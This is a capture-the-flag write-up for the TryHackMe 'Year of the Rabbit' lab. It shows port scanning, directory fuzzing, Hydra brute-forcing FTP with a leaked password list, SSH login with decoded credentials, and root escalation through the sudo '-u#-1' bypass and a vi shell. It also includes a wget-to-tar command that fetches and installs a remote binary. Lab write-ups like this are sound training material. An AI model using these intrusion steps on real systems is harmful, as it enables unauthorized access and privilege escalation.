# Year of the Rabbit
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Let's have a nice gentle start to the New Year!
Can you hack into the Year of the Rabbit box without falling down a hole?

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* Rabbit Holes
* Hidden HTTP requests
* FTP
* Brainfuck Encoding
* SSH
* Sudoers Bypassing

Tools used
--
* nmap
* ffuf
* burpsuite
* ftp
* ssh
* find
* sudo

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.165.50
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.165.50 -p- -T5 -vvv -g 53

<SNIP>
Discovered open port 80/tcp on 10.10.165.50
Discovered open port 22/tcp on 10.10.165.50
Discovered open port 21/tcp on 10.10.165.50
<SNIP>
```
Let's start to fuzz the HTTP service:
```
ffuf -u http://10.10.165.50/FFUF -H 'Host: 10.10.165.50' -H 'User-Agent: Mozill
a/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtm
l+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Enco
ding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec
-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 39ms]
```
Inside the `assets` path, we have two files: `RickRolled.mp4` and `style.css`.

The `style.css` file contains the following statement:
```css
/* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```
## Phase 2: Foothold

If we give a look to this PHP page, we get a popup message with the following text:
```
Word of advice... Turn off your javascript...
```
and we are redirect to Youtube.

Let's try to disable Javascript on our Firefox browser by navigating to `about:config`, search for `javascript` and disable `javascript.enabled` by setting it as `false`.

If we visit again the `sup3r_s3cr3t_fl4g.php`, we are not redirected anymore and we land on a webpage with video and a text reporting:
```
Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
```
If we visit the source code of this page, we notice that the Javascript code was used for redirecting us to YouTube.

by the way, if we listen the embedded video, around 1 minutes we hear a voice saying that we are in the wrong place.

Let's try to focus on the steganography. So, by using `binwalk` let's extract some interesting file from the `RickRolled.mp4` file:
```
binwalk -e RickRolled.mp4

binwalk RickRolled.mp4 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8610811       0x8363FB        Cisco IOS experimental microcode, for ""
66694464      0x3F9AD40       Uncompressed Adobe Flash SWF file, Version 114, File size (header included) 116146852
77987059      0x4A5FCF3       MySQL MISAM index file Version 6
89148578      0x5504CA2       LZ4 compressed data, legacy
89390783      0x553FEBF       MySQL ISAM index file Version 9

WARNING: Extractor.execute failed to run external extractor 'unstuff '%e'': [Errno 2] No such file or directory: 'unstuff', 'unstuff '%e'' might not be installed correctly
112211718     0x6B03706       StuffIt Deluxe Segment (data): fK
183068423     0xAE96707       MySQL ISAM compressed data file Version 6
200345565     0xBF107DD       MySQL MISAM index file Version 1
228904536     0xDA4CE58       gzip compressed data, has header CRC, last modified: 2098-03-25 13:36:58 (bogus date)

WARNING: Extractor.execute failed to run external extractor 'unstuff '%e'': [Errno 2] No such file or directory: 'unstuff', 'unstuff '%e'' might not be installed correctly
267780318     0xFF600DE       StuffIt Deluxe Segment (data): f5
318828326     0x1300EF26      MySQL ISAM compressed data file Version 1
```
We got some WARNING message about `unstuff` command not found. It is a MAC OS X command for unzipping some archives. We can get install it on our side by:
```
# Install unstuff (closed source) to extract StuffIt archive files
$ wget -O - http://downloads.tuxfamily.org/sdtraces/BottinHTML/stuffit520.611linux-i386.tar.gz | tar -zxv
$ sudo cp bin/unstuff /usr/local/bin/
```
Then, delete the extracted files and re-extract again by using `binwalk`:
```
binwalk -e RickRolled.mp4

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8610811       0x8363FB        Cisco IOS experimental microcode, for ""
66694464      0x3F9AD40       Uncompressed Adobe Flash SWF file, Version 114, File size (header included) 116146852
77987059      0x4A5FCF3       MySQL MISAM index file Version 6
89148578      0x5504CA2       LZ4 compressed data, legacy
89390783      0x553FEBF       MySQL ISAM index file Version 9
112211718     0x6B03706       StuffIt Deluxe Segment (data): fK
183068423     0xAE96707       MySQL ISAM compressed data file Version 6
200345565     0xBF107DD       MySQL MISAM index file Version 1
228904536     0xDA4CE58       gzip compressed data, has header CRC, last modified: 2098-03-25 13:36:58 (bogus date)
267780318     0xFF600DE       StuffIt Deluxe Segment (data): f5
318828326     0x1300EF26      MySQL ISAM compressed data file Version 1
```
After the extraction, we see that the extracted files were useless and unusable, so we fell in a Rabbit Hole.

Let's go back, open Burpsuite and check for some HTTP requests from beginning that could be interesting. Re-enable Javascript on the browser and check by Burp the connection to `http://10.10.165.50/sup3r_s3cret_fl4g.php`.

We can see that is a request in the middle as:
```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.165.50
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

```
If we visit the hidden directory `WExYY2Cv-qU`, we can see a `.png` image. Let's download it.

Note: if you cannot get this image file because you are redirected to YouTube, try to get it by writing the name directly on the browser: `http://10.10.165.50/WExYY2Cv-qU/Hot_Babe.png`

Let's search for some interesting words in this image:
```
<SNIP>
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```
Save these passwords inside a `wordlist.txt` file and run Hydra for bruteforcing FTP access:
```
hydra -l ftpuser -P wordlist.txt 10.10.165.50 ftp

[DATA] attacking ftp://10.10.165.50:21/
[21][ftp] host: 10.10.165.50   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
```
Then:
```
ftp 10.10.165.50 -n
Connected to 10.10.165.50.
220 (vsFTPd 3.0.2)
ftp> user
(username) ftpuser
331 Please specify the password.
Password: 5iez1wGXKfPKQ
230 Login successful.

ftp> get Eli's_Creds.txt
```
This file contains the following:
```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->---<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->-----<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >+++++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
These characters are encoded as "Brainfuck Encoding". Their decoding is:
```
User: eli
Password: DSpDiM1wAEwid
```
Let's use them for connecting by SSH:
```
ssh 10.10.165.50 -l eli
eli@10.10.165.50's password: DSpDiM1wAEwid

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```
Let's search this hidden message:
```
find / -name "s3cr3t"

<SNIP>
/usr/games/s3cr3t
<SNIP>
```
Then, inside it, we have `.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!` file:
```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
Let's jump on Gwendoline user:
```
su gwendoline
Password: MniVCQVhQHUNI

cat /home/gwendoline/user.txt
```

## Phase 3: Privilege Escalation

Run:
```
sudo -l

Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
`ALL` means we can run that specific command on behalf of any user, but since we have also `!root`, all users except root. But we can bypass it by running:
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Then we can call the shell inside VI.

In this way we bypassed the `!root` security check because Sudo doesn't check for the existence of the specified user id and executes it with arbitrary user id with the sudo priv, `-u#-1` returns as 0 which is root's id.